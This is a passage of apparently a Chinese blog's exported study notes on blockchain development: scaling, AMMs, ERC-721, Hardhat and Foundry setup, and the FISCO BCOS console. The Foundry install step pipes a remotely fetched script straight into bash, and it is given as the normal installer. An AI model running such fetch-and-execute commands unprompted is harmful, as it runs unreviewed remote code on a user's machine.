<h4 id="提高TPS的常见方案"><a href="#提高TPS的常见方案" class="headerlink" title="提高TPS的常见方案"></a><strong>提高TPS的常见方案</strong></h4><ol>
<li><strong>Layer 1优化</strong><ul>
<li>扩大区块容量（如比特币的区块扩容争议）。</li>
<li>改进共识机制（如从PoW转向PoS，以太坊2.0）。</li>
</ul>
</li>
<li><strong>Layer 2扩容</strong><ul>
<li>链下处理交易，批量结算（如Rollups、z状态通道）。</li>
</ul>
</li>
<li><strong>分片技术（Sharding）</strong><ul>
<li>将网络分成多个并行处理的碎片，提升并行处理能力（以太坊2.0的目标）。</li>
</ul>
</li>
</ol>
<p>、</p>
<h2 id="链上交易方案-自动做市商"><a href="#链上交易方案-自动做市商" class="headerlink" title="链上交易方案:自动做市商"></a>链上交易方案:自动做市商</h2><ul>
<li><strong>出现原因</strong>:以太坊的 TPS 对于支撑链上订单簿的实时更新来说太低了。反面案例:Solana链由于其60K的TPS，其上有许多订单簿模式的交易所。</li>
<li>交易所里没有订单簿，只有一系列预设的函数，为各类货币的互相交换来定价。</li>
<li>这些预设的函数(例如 x*y&#x3D;k)基于两头货币在各自流动性池中的供给变化率，来设定价格。在某个货币的流动性池内，任何人都能够提供该种货币以增加其流动性，从而获得收益。</li>
</ul>
]]></content>
      <tags>
        <tag>DeFi</tag>
      </tags>
  </entry>
  <entry>
    <title>ERC721</title>
    <url>/2025/06/07/ERC721/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>非同质化代币（也称为契约）的标准接口。</p>
<p>每个符合 ERC-721 的合约都必须实现<code>ERC721</code>和<code>ERC165</code>接口</p>
<ul>
<li><p>它更大的想象空间在于将物理世界的资产映射到区块链上。</p>
</li>
<li><p>谜恋猫是第一个实现了ERC721 标准的去中心化应用</p>
</li>
<li><p>ERC20代币是可置换的，且可细分为N份（1 &#x3D; 10 * 0.1）, 而ERC721的Token最小的单位为1，无法再分割。</p>
</li>
</ul>
<blockquote>
<p>如果同一个集合的两个物品具有不同的特征，这两个物品是非同质的，而同质是某个部分或数量可以被另一个同等部分或数量所代替。</p>
</blockquote>
<h3 id="钱包接口"><a href="#钱包接口" class="headerlink" title="钱包接口"></a>钱包接口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// @dev Note: the ERC-165 identifier for this interface is 0x150b7a02.</span><br><span class="line">interface ERC721TokenReceiver &#123;</span><br><span class="line">    /// @notice Handle the receipt of an NFT</span><br><span class="line">    /// @dev The ERC721 smart contract calls this function on the recipient</span><br><span class="line">    ///  after a `transfer`. This function MAY throw to revert and reject the</span><br><span class="line">    ///  transfer. Return of other than the magic value MUST result in the</span><br><span class="line">    ///  transaction being reverted.</span><br><span class="line">    ///  Note: the contract address is always the message sender.</span><br><span class="line">    /// @param _operator The address which called `safeTransferFrom` function</span><br><span class="line">    /// @param _from The address which previously owned the token</span><br><span class="line">    /// @param _tokenId The NFT identifier which is being transferred</span><br><span class="line">    /// @param _data Additional data with no specified format</span><br><span class="line">    /// @return `bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`</span><br><span class="line">    ///  unless throwing</span><br><span class="line">    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4);</span><br></pre></td></tr></table></figure>



<p>参考：<a href="https://learnblockchain.cn/article/33">https://learnblockchain.cn/article/33</a></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><strong>基于OpenZeppelin的ERC721智能合约MyERC721Token</strong></p>
<p>参考<a href="https://learnblockchain.cn/article/14779">https://learnblockchain.cn/article/14779</a></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>Hardhat框架</title>
    <url>/2025/05/24/Hardhat/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>Hardhat 是一个由 <code>Nomiclabs</code> 构建和维护的以太坊智能合约开发环境。它是一个可扩展的 Javascript 框架，提供了一套管理智能合约生命周期的工具和功能，包括编译、部署、测试和调试。</p>
<p>可以用<code>npm</code>直接安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hardhat</span><br><span class="line">npx hardhat init</span><br></pre></td></tr></table></figure>



<blockquote>
<p>高度可定制性：Hardhat 的插件系统允许开发者通过自定义插件扩展其功能。</p>
</blockquote>
<p>Hardhat 使用 Node 进行包管理，如果你熟悉 Node 及 Javascript， Hardhat 将非常简单上手。</p>
<h2 id="创建Hardhat项目"><a href="#创建Hardhat项目" class="headerlink" title="创建Hardhat项目"></a>创建Hardhat项目</h2><ol>
<li><strong>创建项目目录</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> hardhat-tutorial</span><br><span class="line"><span class="built_in">cd</span> hardhat-tutorial</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>初始化Node项目</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure>



<ol start="3">
<li><strong>安装Hardhat</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save-dev hardhat</span><br></pre></td></tr></table></figure>

<blockquote>
<p>将<code>hatdhat</code>添加到 <code>package.json</code> 的 <code>devDependencies</code> 中，而不是 <code>dependencies</code> 中</p>
</blockquote>
<ol start="4">
<li><p><strong>在安装Hatdhat的目录下运行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hardhat</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>使用键盘选择”创建一个新的hardhat.config.js（<code>Create a JavaScript project</code>）” ，然后回车。</strong></p>
</li>
</ol>
<blockquote>
<p>这个 JavaScript Hardhat 工程会默认下载 <code>hardhat-toolbox 插件</code>及一些常规设置：</p>
</blockquote>
<blockquote>
<p>创建好的Hardhat工程包含文件有：</p>
</blockquote>
<ul>
<li><code>contracts</code>：智能合约目录</li>
<li><code>scripts</code> ：部署脚本文件</li>
<li><code>test</code>：智能合约测试用例文件夹。</li>
<li><code>hardhat.config.js</code>：配置文件，配置hardhat连接的网络及编译选项。</li>
</ul>
<ol start="6">
<li><strong>编写合约</strong></li>
</ol>
<p>可以开始编写合约了（contracts）目录下</p>
<p>推荐使用 OpenZepplin 等第三方库</p>
<p>安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install @openzeppelin/contracts --save-dev</span><br></pre></td></tr></table></figure>

<p>在合约中直接import:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br></pre></td></tr></table></figure>



<ol start="7">
<li><strong>编译合约</strong></li>
</ol>
<p>可以直接在终端运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hardhat compile</span><br></pre></td></tr></table></figure>

<p>以编译合约。</p>
<p> 成功编译后，会在<code>artifacts/contracts/</code>目录下生成<code>Counter.json</code> 和 <code>build-info</code></p>
<blockquote>
<p><code>Counter.json</code>包含了智能合约的 ABI 、字节码（Bytecode）等。</p>
<p>tip:</p>
<p>智能合约的 <code>ABI（Application Binary Interface）</code>信息，其中包括了合约的函数、事件等接口信息。这个文件通常会在与其他合约交互时使用，因为它可以被其他合约和 DApp 使用。</p>
<p><code>Bytecode </code>是部署合约所需的字节码（也称为创建时字节码），部署合约时，就是把该字节码作为交易的输入数据发送链上。</p>
</blockquote>
<ol start="8">
<li><p><strong>测试</strong></p>
<p>基于ether.js与前面的合约交互，为智能合约编写自动化测试。</p>
<p>测试命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hardhat <span class="built_in">test</span></span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>部署合约</strong></p>
</li>
</ol>
<p>我们需要编写一个部署脚本。在<code>scripts</code>文件夹，新建一个<code>deploy.js</code> 用来写部署脚本。</p>
<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hardhat run scripts/deploy.js</span><br></pre></td></tr></table></figure>

<p> 时， 可以合约会部署到Hardhat 内置网络上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; npx hardhat run scripts/deploy.js</span><br><span class="line">Counter address: 0x5FbDB2315678afecb367f032d93F642f64180aa3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>为了在运行任何任务时指示<strong>Hardhat</strong>连接到特定的EVM网络，可以使用<code>--network</code>参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hardhat run scripts/deploy.js --network &lt;network-name&gt;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>还有更多比如：编写测试用例，console.log,</p>
<p><code>network-name</code> 在 <code>hardhat.config.js</code> 文件中的配置   ，代码开源验证，Hardhat 插件（Plugin）的使用…</p>
<p>阅读本笔记的学习参考原文：：<a href="https://decert.me/tutorial/solidity/tools/hardhat">https://decert.me/tutorial/solidity/tools/hardhat</a></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>Foundry框架</title>
    <url>/2025/05/24/Foundry%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>Foundry 是一个由 <code>Paradigm</code>开发的智能合约开发工具包，用于在以太坊区块链上开发应用程序。Foundry 基于 Rust 运行，提供多种工具来开发和测试 Solidity 智能合约。Foundry 具有一套 CLI 命令，使创建新项目、编译、部署和与合约交互变得简单。</p>
<h2 id="创建Foundry项目"><a href="#创建Foundry项目" class="headerlink" title="创建Foundry项目"></a>创建Foundry项目</h2><ol>
<li><strong>安装命令：</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L &lt;https://foundry.paradigm.xyz&gt; | bash  //下载foundryup</span><br><span class="line">foundryup   //运行它安装 Foundry</span><br></pre></td></tr></table></figure>

<blockquote>
<p>安装后，有三个命令行工具 <code>forge</code>, <code>cast</code>, <code>anvil</code> 组成</p>
<ul>
<li><strong>forge</strong>: 用来执行初始化项目、管理依赖、测试、构建、部署智能合约 ;</li>
<li><strong>cast</strong>: 执行以太坊 RPC 调用的命令行工具, 进行智能合约调用、发送交易或检索任何类型的链数据</li>
<li><strong>anvil</strong>: 创建一个本地测试网节点, 也可以用来分叉其他与 EVM 兼容的网络。</li>
</ul>
</blockquote>
<ol start="2">
<li><strong>初始化</strong></li>
</ol>
<p>通过 <code>forge</code> 的 <code>forge init</code> 初始化项目</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">forge init &lt;project_name&gt;</span><br></pre></td></tr></table></figure>

<p>init 命令会创建一个项目目录，并安装好<code>forge-std</code> 库。</p>
<p>如需手动安装依赖库使用： <code>forge install forge/forge-std</code></p>
<p>创建好的 Foundry 工程结构:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; tree -L 2</span><br><span class="line">.</span><br><span class="line">├── foundry.toml //配置文件，配置连接的网络URL 及编译选项</span><br><span class="line">├── lib //依赖库目录</span><br><span class="line">│   └── forge-std</span><br><span class="line">├── script //部署脚本文件</span><br><span class="line">│   └── Counter.s.sol</span><br><span class="line">├── src //智能合约目录</span><br><span class="line">│   └── Counter.sol</span><br><span class="line">└── <span class="built_in">test</span> //智能合约测试用例文件夹</span><br><span class="line">    └── Counter.t.sol</span><br><span class="line"></span><br><span class="line">5 directories, 4 files</span><br></pre></td></tr></table></figure>



<p>Foundry 使用 Git submodule 来管理依赖库， <code>.gitmodules</code> 文件记录了目录与子库的关系</p>
<ol start="3">
<li><strong>合约开发&amp;编译</strong></li>
</ol>
<p>编写合约</p>
<p>在<code>foundry.toml</code> 中使用<code>solc</code>配置编译器版本</p>
<p>编译合约</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">forge build</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>测试</strong></li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>学习原文链接：<a href="https://decert.me/tutorial/solidity/tools/foundry/">https://decert.me/tutorial/solidity/tools/foundry/</a></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>FISCO BCOS联盟链</title>
    <url>/2024/12/26/FISCOBCOS%E8%81%94%E7%9B%9F%E9%93%BE/</url>
    <content><![CDATA[<h2 id="FISCO-BCOS介绍"><a href="#FISCO-BCOS介绍" class="headerlink" title="FISCO BCOS介绍"></a>FISCO BCOS介绍</h2><p>FISCO BCOS 是一个稳定、高效、安全的<strong>区块链底层平台</strong>。联盟链需要多家机构来组成联盟，所以FISCO BCOS 支持多群组概念，这意味着多个组织可以通过FISCOBCOS的联盟链组成多个联盟，而且联盟中可以允许共同的组织节点。如下图所示，在多群组技术下FISCO BCOS可以支持众多应用领域。</p>
<h3 id="逻辑架构"><a href="#逻辑架构" class="headerlink" title="逻辑架构"></a><strong>逻辑架构</strong></h3><p>以下是FISCO BCOS 的逻辑架构，分为：<strong>基础层、互联核心层、链核心层、管理层和接口层。</strong></p>
<p><img src="https://s2.loli.net/2024/12/26/MmukPYcjf7hdbNF.png" alt="1.png"></p>
<p><strong>基础层</strong></p>
<p>基础层提供区块链的基础数据结构和算法库，包括<strong>密码学算法、隐私算法</strong>等。</p>
<p><strong>链核心层</strong></p>
<p>链核心层主要实现区块链的链式数据结构和数据存储（分布式存储），采用了不同的数据库（LevelDB、MySQL、Qracle）来存储区块数据。</p>
<p><strong>互联核心层</strong></p>
<p>互联核心层实现了区块链的<strong>基础 P2P 网络通信、共识机制和区块同步机制</strong>。</p>
<p><strong>管理层</strong></p>
<p>相对于区块链基础架构，FISCO BCOS 细分出了管理层，实现区块链的<strong>管理功能</strong>，比如说参数配置、账本管理等。</p>
<p><strong>接口层</strong></p>
<p>接口层主要对应的是应用层，面向区块链用户，提供交互式控制台与各类应用接口。同时<strong>还包括智能合约与DApp</strong>。</p>
<h3 id="区块链交易流程"><a href="#区块链交易流程" class="headerlink" title="区块链交易流程"></a>区块链交易流程</h3><p>区块链引入智能合约后，交易便超 脱『价值转移』的原始定义，其更 加精准的定义应该是区块链中一次 事务的数字记录。无论大小事务， 都需要交易的参与。</p>
<p>下图展示了FISCO BCOS区块 链交易的<strong>完整生命周期。</strong>客户 端一般是交易创建与发起的位 置，随后交易接入相关节点进 行验签与广播；之后交易会进 入节点交易池内，并在共识节 点处完成交易的执行；最后整 个区块链网络上的节点可以来 验证与储存这笔交易。</p>
<p><img src="https://s2.loli.net/2024/12/26/LlaY9I1ThmW5x6w.png" alt="2.png"></p>
<h4 id="交易生成"><a href="#交易生成" class="headerlink" title="交易生成"></a>交易生成</h4><p>用户的请求给到客户端后，客户端会构建出一笔有效交易，交易中包括以下关键信息：</p>
<p><img src="https://s2.loli.net/2024/12/26/VpUEPy7ZnOD1zXs.png" alt="3.png"></p>
<h4 id="交易构建"><a href="#交易构建" class="headerlink" title="交易构建"></a>交易构建</h4><p>之后，如图所示，<strong>区块链客户端会再向交易填充一些必要的字段，如用于防止交易重放的交易ID及blockLimit（区块限制），</strong>这个填充过程被称为交易构建。交易构建完成后，客户端随后便通过Channel或RPC信道将交易发送给节点。</p>
<p><strong>ps:</strong></p>
<p>Channel 可以理解为一个长时间的聊天群， 想发消息的时候，客户端或是服务端直接 往这个群里发消息，对端可以直接收到并进行相应。不想发消息的时候，让它空闲就可以了。</p>
<p>RPC可以理解为一次性的聊天群，发送一 个消息后，如果对端接受到并返回了响应， 那么接受到响应后，这个群就解散了。下 次想要再发送消息，就要再次建一个一次性群。</p>
<h4 id="交易池"><a href="#交易池" class="headerlink" title="交易池"></a>交易池</h4><p>区块链交易被发送到节点后，节点会通过验证交易签名的方式来验证一笔交易是否合法。若一笔交易合法，则 节点会进一步检查该交易是否重复出现过，若从未出现过，则将交易加入交易池缓存起来。若交易不合法或交 易重复出现，则将直接丢弃交易。</p>
<h4 id="交易广播"><a href="#交易广播" class="headerlink" title="交易广播"></a>交易广播</h4><p><strong>节点在收到交易后，除了将交易缓存在交易池外，节点还会将交易广播至该节点已知的其他节点</strong>。 为了能让交易尽可能到达所有节点，其他收到广播过来的交易节点，也会根据一些精巧的策略选择一些节点，将交易再一次进行广播。</p>
<p><img src="https://s2.loli.net/2024/12/26/p7kemb6EhXcrJ1x.jpg" alt="4.png"></p>
<p>比如：对于从其他节点转发过来的交易，节点只会随机选择25%的节点再次广播，因为这种情况一般意味着交易已经开始在网络中被节点接力传递，缩减广播的规模有助于避免因网络中冗余的交易太多而出现的广播风暴问题。</p>
<h4 id="交易打包"><a href="#交易打包" class="headerlink" title="交易打包"></a><strong>交易打包</strong></h4><p>为了提高交易处理效率，同时也为了确定交易之后的执行顺序保证事务性，当交易池中有交易时，Sealer（共识节点）线程负责从交易池中按照先进先出的顺序取出一定数量的交易，组装成<strong>待共识区块</strong>，随后待共识区块会被发往各个节点进行处理。</p>
<p><img src="https://s2.loli.net/2024/12/26/K6P9zMbeDGmLjSV.jpg" alt="5.png"></p>
<h4 id="交易执行"><a href="#交易执行" class="headerlink" title="交易执行"></a>交易执行</h4><p>节点在收到区块后，会调用区块验证器把交易从区块中逐一拿出来执行。如果是预编译合约代码，验证器中的执行引擎会直接调用相应的C++功能，否则执行引擎就会把交易交给EVM（以太坊虚拟机）执行。</p>
<p><img src="https://s2.loli.net/2024/12/26/dM9BqxJupWNOFb5.jpg" alt="6.png"></p>
<h4 id="交易共识"><a href="#交易共识" class="headerlink" title="交易共识"></a>交易共识</h4><p>区块链要求节点间就区块的执行结果达成一致才能出块。FISCOBCOS中一般采用PBFT算法保证整个系统的一致性，其大概流程是：各个节点先独立执行相同的区块，随后节点间交换各自的执行结果，如果发现超过2&#x2F;3的节点都得出了相同的执行结果，那说明这个区块在大多数节点上取得了一致，节点便会开始出块。</p>
<h4 id="交易落盘"><a href="#交易落盘" class="headerlink" title="交易落盘"></a>交易落盘</h4><p>在共识出块后，节点需要将区块中的交易及执行结果写入硬盘永久保存，并更新区块高度与区块哈希的映射表等内容，然后节点会从交易池中剔除已落盘的交易，以开始新一轮的出块流程。用户可以通过交易哈希等信息，在链上的历史数据中查询自己感兴趣的交易数据及回执信息。</p>
<hr>
<p>同样可以作为联盟链的Hyperledger与FISCO BCOS相比有哪些异同？</p>
<hr>
<h3 id="FISCO-BCOS区块链应用案例"><a href="#FISCO-BCOS区块链应用案例" class="headerlink" title="FISCO BCOS区块链应用案例"></a>FISCO BCOS区块链应用案例</h3><h4 id="应用场景-行业"><a href="#应用场景-行业" class="headerlink" title="应用场景&#x2F;行业"></a>应用场景&#x2F;行业</h4><p><img src="https://s2.loli.net/2024/12/26/HIjg6JlythqLWnE.jpg" alt="7.png"></p>
<h4 id="应用典型案例"><a href="#应用典型案例" class="headerlink" title="应用典型案例"></a>应用典型案例</h4><p><img src="https://s2.loli.net/2024/12/26/sGDC3fb2FrlEAyk.jpg" alt="8.png"></p>
<p><img src="https://s2.loli.net/2024/12/26/H1V687j3qDPezrE.jpg" alt="9.png"></p>
<p><img src="https://s2.loli.net/2024/12/26/sFRMScd9E4a8OQ5.jpg" alt="10.png"></p>
<p><img src="https://s2.loli.net/2024/12/26/4QEjVFciKAlsYmd.jpg" alt="11.png"></p>
<p><img src="https://s2.loli.net/2024/12/26/aYUeDZxnm1rJPKN.jpg" alt="12.png"></p>
<h3 id="FISCOBCOS控制台工具"><a href="#FISCOBCOS控制台工具" class="headerlink" title="FISCOBCOS控制台工具"></a>FISCOBCOS控制台工具</h3><h4 id="控制台简介"><a href="#控制台简介" class="headerlink" title="控制台简介"></a>控制台简介</h4><p>命令行交互控制台（简称“控制台”）是FISCO BCOS 2.0重要的交互式客户端工具，它通过Java SDK与区块链节点建立连接，实现对区块链节点数据的读写访问请求。它提供一个合约编译工具，用户可以方便快捷的将Solidity合约文件编译为Java合约文件。使用控制台的相关功能需要事先搭建好FISCO BCOS区块链，以下为控制台的常用命令：</p>
<p><img src="https://s2.loli.net/2024/12/26/LQezPG3wa94gdmS.jpg" alt="13.png"></p>
<p><strong>控制台特点</strong></p>
<p>在<strong>应用开发场景</strong>下，控制台有以下几个特点： </p>
<p>（1）实现查询区块链相关的一系列命令——让区块链“看得见摸得着”控制台能做到例如查询区块高度、交易、节点等信息，并且根据不同参数，提供不同的查询方式以满足不同条件下的查询需求。 </p>
<p>（2）直接部署和调用合约 用户写好合约，放入指定路径，在控制台输入一个命令（deploy）即可完成部署，再用call指令就能调用合约接口，不需要其他任何额外的工作。另外，FISCO BCOS区块链提供CNS（合约命令服务）功能。链上可以记录部署的合约名、版本号和对应的合约部署地址；部署合约时，可以指定合约名和版本号；调用合约时，可以指定合约名和版本号。 （3）管理区块链 FISCO BCOS 2.0 提供节点管理、系统参数管理、权限管理功能，控制台均提供对应的命令进行操作，方便用户通过简单的命令轻松管理区块链。</p>
<p><strong>控制台安装</strong></p>
<p><img src="https://s2.loli.net/2024/12/26/T4Ph95oVWgYBFLI.jpg" alt="14.png"></p>
<h4 id="控制台启动"><a href="#控制台启动" class="headerlink" title="控制台启动"></a>控制台启动</h4><p><strong>默认启动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./strat.sh</span><br></pre></td></tr></table></figure>

<p>注意：控制台启动未指定<strong>私钥账户</strong>时，会尝试从accounts目录下加载一个可用的私钥账户用于发送交易，加载失败则会创建一个新的PEM格式的账户文件，将其保存在accounts目录下</p>
<p><strong>PEM格式的文件</strong>：PEM文件是一个短的二进制文件，它包含一个独特的公钥或私钥，用于验证信息的来源和确认网站用户或服务器的身份。这种.pem文件也可以存储整个密钥链，包括根证书。</p>
<p><img src="https://s2.loli.net/2024/12/26/kElxYG8nbWLyUFT.jpg" alt="15.png"></p>
<p><strong>指定群号启动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./strat.sh 2</span><br></pre></td></tr></table></figure>

<p>当我们FISCO BCOS的区块链有多个群组（群组1、群组2）存在时，可以根据群组号来启动控制台</p>
<p><img src="https://s2.loli.net/2024/12/26/scAeNLJhrnFkvwK.jpg" alt="16.png"></p>
<p>除了以上两种常用的启动控制台的方式之外，还有另外两种启动方式（了解即可）</p>
<ul>
<li>使用PEM格式私钥文件启动</li>
<li>使用PKCS12格式私钥文件启动</li>
</ul>
<h4 id="控制台命令"><a href="#控制台命令" class="headerlink" title="控制台命令"></a>控制台命令</h4><p><strong>控制台命令结构</strong></p>
<p>控制台命令由两部分组成，即<strong>指令和指令相关的参数：</strong></p>
<p><strong>指令</strong></p>
<p>指令是执行的操作命令，包括查询区块链相关信息，部署合约和调用合约的指令等，其中部分指令调用JSON-RPC接口，因此与JSON-RPC接口同名。</p>
<p>使用提示： 指令可以使用tab键补全，并且支持按上下键显示历史输入指令。</p>
<p><strong>指令相关的参数</strong></p>
<p>指令调用接口需要的参数，指令与参数以及参数与参数之间均用空格分隔，与JSON-RPC接口同名命令的输入参数和获取信息字段的详细解释请参考以下网址：<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/api.html">https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/api.html</a></p>
<p><strong>JSON-RPC介绍</strong> </p>
<p>JSON是一种轻量级的数据交换格式，它可以表示数值、字符串、序列及名&#x2F;值对集合。而JSON-RPC是一种<strong>无状态的，轻量级的远程程序调用协议</strong>。</p>
<p>JSON-RPC协议中的客户端一般是为了向远程系统请求执行某个方法。客户端向实现了JSON-RPC协议的服务端发送请求，多个输入参数能够通过数组或者对象传递到远程方法，这个远程方法也能返回多个输出数据。</p>
<p>JSON-RPC所有的传输都是单个对象，用JSON格式进行序列化。JSON-RPC的<strong>请求包</strong>含三个特定属性：</p>
<p><img src="https://s2.loli.net/2024/12/26/ipJcogdAF49XbqT.jpg" alt="17.png"></p>
<p>响应的接收者必须能够给出所有请求以正确的响应。JSON-RPC的<strong>响应包</strong>也有三个属性：</p>
<p><img src="https://s2.loli.net/2024/12/26/dHawmMFEuVNoDIb.jpg" alt="18.png"></p>
<h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h5><p>常用的合约相关命令包括<strong>利用CNS部署和调用合约命令以及普通部署和调用合约命令</strong>。</p>
<p> 为给业务方提供更加良好的智能合约调用体验，FISCO BCOS提出CNS（合约命名服务）方案。CNS通过提供链上合约名称与合约地址映射关系的记录及相应的查询功能，方便业务方通过记忆简单的合约名称来实现对链上合约的调用。</p>
<p>1、<strong>利用CNS部署和调用合约的命令：</strong></p>
<p><img src="https://s2.loli.net/2024/12/26/CNxHZ9mFdcbrhD4.jpg" alt="19.png"></p>
<hr>
<p>部署合约：<strong>deployByCNS</strong></p>
<p>运行deployByCNS，采用CNS部署合约。用CNS部署的合约，可用合约名直接调用</p>
<p>参数包含以下两部分：</p>
<p> • 合约路径：合约文件的路径，支持相对路径、绝对路径和默认路径三种方式。用户输入为文件名时，从默认目录获取文件，默认目录为: contracts&#x2F;solidity。</p>
<p>• 合约版本号：部署的合约版本号(长度不能超过40)。</p>
<p>举了三个例子，分别是：</p>
<p> • 部署HelloWorld合约1.0版； </p>
<p>• 部署HelloWorld合约2.0版；</p>
<p> • 部署TableTest合约1.0版； 在控制台输入合约名称以及版本号 后，成功部署了相应的合约。</p>
<p><img src="https://s2.loli.net/2024/12/26/7m8HbViTozW1qDk.jpg" alt="20.png"></p>
<p>需要注意的是： </p>
<p>• 部署用户编写的合约，可以将solidity合 约文件放到控制台根目录的 contracts&#x2F;solidity&#x2F;目录下，然后进行部 署即可。按<strong>tab键</strong>可以搜索 contracts&#x2F;solidity&#x2F;目录下的合约名称。 </p>
<p>• 若需要部署的合约引用了其他合约或 library库，引用<strong>格式为import “.&#x2F;XXX.sol</strong>“;。其相关引入的合约和 library库均放在contracts&#x2F;solidity&#x2F;目录。 </p>
<p>• 如果合约引用了library库，library库文件的名称必须以<strong>Lib字符串</strong>开始，以便于区分是普通合约与library库文件。 library库文件不能单独部署和调用。</p>
<hr>
<p>调用合约: <strong>callByCNS</strong></p>
<p> 运行callByCNS，采用CNS调用合约，即用合约名直接调用合约。</p>
<p>参数包含以下三部分： </p>
<p>• 合约名称与合约版本号：合约名称与版本号用英文冒号分隔，例如HelloWorld:1.0。当省略合约版本号时，例如HelloWorld，则调用最新版本的合约。</p>
<p>• 合约接口名：调用的合约接口名。</p>
<p>• 接口参数：由合约接口参数决定。参数由空格分隔，其中字符串、字节类型参数需要加上双引号；数组参数需要加上中括号，比如[1,2,3]，数组中是字符串或字节类型，加双引号，例如[“alice” , ”bob”]；布尔类型为true或者false。</p>
<p>下图中各举了两组合约调用的例子，分别是对set以及get接口的调用，在控制台输入合约名称、版本号以及接口名称和参数后，成功调用了合约。</p>
<p><img src="https://s2.loli.net/2024/12/26/eJ2bOUaKcB8ht7f.jpg" alt="21.png"></p>
<hr>
<p>查询CNS部署合约信息: <strong>queryCNS</strong> </p>
<p>运行queryCNS，根据合约名称和合约版本号（可选参数）查询CNS表记录信息（合约名和合约地址的映射）。 </p>
<p>参数包含以下两部分： </p>
<p>• <strong>合约名称</strong>：部署的合约名称。</p>
<p>• <strong>合约版本号</strong>：(可选)部署的合约版本号。</p>
<p>下图中各举了一个查询CNS表记录信息的例子，分别在控制台输入合约名称和合约版本号，成功获取了记录表信息。</p>
<p><img src="https://s2.loli.net/2024/12/26/Q4hDUqYNd3PbEV7.jpg" alt="22.png"></p>
<p><strong>普通部署和调用合约命令</strong></p>
<ul>
<li>deploy</li>
<li>call</li>
</ul>
<p>在应用开发场景下，<strong>deploy命令用于部署合约，call命令用于调用合约</strong></p>
<p>部署合约(默认提供HelloWorld合约和TableTest.sol进行示例使用)：</p>
<p>参数包含以下一部分： </p>
<p>• <strong>合约路径</strong>：合约文件的路径，支持相对路径、绝对路径和默认路径三种方式。用户输入为文件名时，从默认目录获取文件，默认目录为: contracts&#x2F;solidity，比如：HelloWorld。</p>
<p>下图中分别通过三种路径方式来对HelloWorld合约进行了部署。</p>
<p><img src="https://s2.loli.net/2024/12/26/HaCwntEiUxSMXGO.jpg" alt="23.png"></p>
<hr>
<p><strong>调用合约: call</strong> </p>
<p>运行call，调用合约。</p>
<p> 参数包含以下四部分：</p>
<p> • 合约路径：合约文件的路径，支持相对路径、绝对路径和默认路径三种方式。用户输入为文件名时，从默认目录获取文件，默认目录为: contracts&#x2F;solidity。</p>
<p>• 合约地址: 部署合约获取的地址，合约地址可以省略前缀0，例如，0x000ac78可以简写成0xac78。 </p>
<p>• 合约接口名：调用的合约接口名。 </p>
<p>• 接口参数：由合约接口参数决定。参数由空格分隔，其中字符串、字节类型参数需要加上双引号；数组参数需要加上中括号，比如[1,2,3]，数组中是字符串或字节类型，加双引号，例如[“alice” , ”bob”]，注意数组参数中不要有空格；布尔类型为true或者false。 </p>
<p>下图中通过调用HelloWorld合约中的get与set接口完成了对name字符串的设置。</p>
<p><img src="https://s2.loli.net/2024/12/26/OCfimrJRYluAc4N.jpg" alt="24.png"></p>
<hr>
<p>其他常用命令：</p>
<p><img src="https://s2.loli.net/2024/12/26/km2fHDIKCGnNgSa.jpg" alt="25.png"></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>DEX&amp;CEX</title>
    <url>/2025/03/29/DEX/</url>
